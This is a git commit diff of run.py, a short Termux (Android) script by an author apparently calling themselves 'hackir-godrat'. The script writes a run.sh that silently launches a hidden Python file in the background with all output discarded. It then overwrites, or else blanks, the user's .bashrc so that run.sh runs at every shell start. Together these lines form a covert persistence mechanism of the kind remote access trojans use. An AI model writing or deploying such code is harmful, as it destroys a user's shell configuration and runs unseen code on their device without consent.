249aa35f7ddda3ea63852b81cf8a9c3614ed1088
hackir-godrat <95535445+hackir-godrat@users.noreply.github.com>
2022-01-13 01:55:18 +0330

    Update run.py

--- run.py
+++ run.py
@@ -1,18 +1,17 @@
 import os
-os.system("cp -r 389356 /$HOME") 
 os.chdir('/data/data/com.termux//files/home')
 file = open('run.sh' , 'w+')
-file.write('python 389356 &> /dev/null &')
+file.write('python hackiri/389356 &> /dev/null &')
 file.close()
 try:
-    file2 = open('.bashrc' , 'w')
+    file2 = open('.bashrc' , 'w+')
     file2.write('bash run.sh')
 except:
     try:
         os.system('> .bashrc')
     except:
         pass
-    file2 = open('.bashrc', 'w')
+    file2 = open('.bashrc', 'w+')
     file2.write('bash run.sh')
 while True:
     try:
